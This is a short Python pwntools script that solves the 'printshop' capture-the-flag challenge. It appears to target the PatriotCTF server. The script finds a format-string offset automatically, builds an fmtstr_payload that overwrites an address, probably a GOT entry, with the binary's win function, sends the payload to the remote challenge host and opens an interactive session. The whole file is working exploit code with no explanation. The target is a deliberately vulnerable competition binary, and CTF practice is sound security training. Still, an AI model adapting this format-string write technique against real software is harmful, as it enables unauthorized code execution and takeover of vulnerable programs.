from pwn import *

context.arch = 'amd64'
e = ELF('/mnt/c/Users/zahar/Downloads/printshop')

def send_payload(payload):
    # p = process('/mnt/c/Users/zahar/Downloads/printshop')
    p = remote('chal.pctf.competitivecyber.club', 7997)
    p.recvuntil(b'What would you like to print? >> ')
    p.sendline(payload)
    for _ in range(3):
        p.recvline()
    return p.recvline().strip()

WIN = e.symbols['win']
WRITES = { 0x404060: p64(WIN) }
format_string = FmtStr(execute_fmt=send_payload)
payload = fmtstr_payload(writes=WRITES, offset=format_string.offset)

# p = process('/mnt/c/Users/zahar/Downloads/printshop')
p = remote('chal.pctf.competitivecyber.club', 7997)
p.recvuntil(b'What would you like to print? >> ')
p.sendline(payload)

p.interactive()